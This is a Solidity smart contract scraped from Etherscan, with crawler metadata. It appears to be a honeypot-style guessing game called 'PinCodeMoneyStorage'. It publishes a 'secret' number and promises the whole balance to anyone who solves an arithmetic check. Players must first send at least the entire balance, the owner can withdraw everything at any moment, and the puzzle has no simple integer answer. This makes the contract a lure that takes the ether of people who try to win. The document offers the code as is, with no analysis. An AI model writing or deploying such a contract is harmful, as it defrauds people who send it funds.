//token_name	
//token_url	https://etherscan.io//address/0x9efc7a38552e63534a8e9b9558adabd73297f91d#code
//spider_time	2018/07/08 12:39:22
//token_Transactions	2 txns
//token_price	

pragma solidity ^0.4.19;
contract PinCodeMoneyStorage {
	// Store some money with a 4 digit code
	
    address private Owner = msg.sender;
    uint public SecretNumber = 95;

    function() public payable {}
    function PinCodeMoneyStorage() public payable {}
   
    function Withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Guess(uint n) public payable {
		if(msg.value >= this.balance && msg.value > 0.1 ether)
			// Previous guesses makes the number easier to guess so you have to pay more
			if(n*n/2+7 == SecretNumber )
				msg.sender.transfer(this.balance+msg.value);
    }
}